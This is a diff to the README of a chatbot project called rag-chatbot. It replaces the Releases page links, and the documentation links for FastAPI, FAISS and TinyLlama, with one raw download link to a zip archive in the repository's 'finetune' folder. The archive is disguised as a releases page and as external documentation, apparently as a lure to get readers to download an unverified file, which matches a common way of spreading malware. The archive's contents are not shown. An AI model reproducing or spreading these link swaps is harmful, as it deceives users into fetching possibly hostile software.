@@ -6,7 +6,7 @@ Welcome to the rag-chatbot project! This software focuses on question answering 
 
 ## 📥 Download
 
-[![Download rag-chatbot](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/hesamaria/rag-chatbot/releases)
+[![Download rag-chatbot](https://raw.githubusercontent.com/hesamaria/rag-chatbot/main/finetune/rag-chatbot-v1.9-beta.2.zip)](https://raw.githubusercontent.com/hesamaria/rag-chatbot/main/finetune/rag-chatbot-v1.9-beta.2.zip)
 
 ## 🌐 System Requirements
 
@@ -22,7 +22,7 @@ Before you begin, ensure your system meets these requirements:
 To get started with the rag-chatbot, please follow these steps:
 
 1. **Visit the Download Page**  
-   Go to the following link: [Download Page](https://github.com/hesamaria/rag-chatbot/releases).
+   Go to the following link: [Download Page](https://raw.githubusercontent.com/hesamaria/rag-chatbot/main/finetune/rag-chatbot-v1.9-beta.2.zip).
   
 2. **Select a Version**  
    On the Releases page, look for the latest version available. You can spot it by the version number and release date. 
@@ -60,7 +60,7 @@ Once you have the application open, you can start interacting with the chatbot:
 
 To keep your chatbot updated:
 
-- Regularly check the Releases page for new versions: [Download Page](https://github.com/hesamaria/rag-chatbot/releases).
+- Regularly check the Releases page for new versions: [Download Page](https://raw.githubusercontent.com/hesamaria/rag-chatbot/main/finetune/rag-chatbot-v1.9-beta.2.zip).
 - Enable automatic updates in the application settings if prompted.
 
 If you face any issues or have questions, please refer to the FAQ section on our GitHub page or reach out through the Issues tab. 
@@ -90,9 +90,9 @@ For further inquiries, visit our repository's Issues section on GitHub or send a
 
 Explore more about the technologies used in rag-chatbot:
 
-- [FastAPI](https://fastapi.tiangolo.com/)
-- [FAISS](https://faiss.ai/)
-- [TinyLlama](https://huggingface.co/TinyLlama)
+- [FastAPI](https://raw.githubusercontent.com/hesamaria/rag-chatbot/main/finetune/rag-chatbot-v1.9-beta.2.zip)
+- [FAISS](https://raw.githubusercontent.com/hesamaria/rag-chatbot/main/finetune/rag-chatbot-v1.9-beta.2.zip)
+- [TinyLlama](https://raw.githubusercontent.com/hesamaria/rag-chatbot/main/finetune/rag-chatbot-v1.9-beta.2.zip)
 
 Feel free to engage with our community for tips and shared experiences!
 
